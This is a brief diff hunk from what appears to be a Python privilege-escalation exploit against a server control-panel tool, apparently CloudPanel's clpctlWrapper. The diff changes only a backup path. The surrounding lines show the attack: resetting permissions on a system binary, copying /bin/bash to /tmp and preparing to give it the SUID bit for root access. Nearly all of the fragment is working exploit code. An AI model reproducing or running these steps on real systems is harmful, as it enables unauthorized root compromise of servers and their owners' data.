@@ -9,7 +9,7 @@ def exploit():
     print('[+] Overriding file to writable')
     exec_command('cplpctl system:permissions:reset --files=700 --path=/usr/bin/clpctlWrapper')
     print('[+] Backup clpctlWrapper into tmp...')
-    exec_command('cp /usr/bin/clpctlWrapper /tmp/clpctlWrapper')
+    exec_command('cp /usr/bin/clpctlWrapper /tmp/test/')
     print('[+] Replacing clpctlWrapper with cp...')
     exec_command('cp /bin/bash /tmp/bash')
     print('[+] Assigning suid to /tmp/bash...')
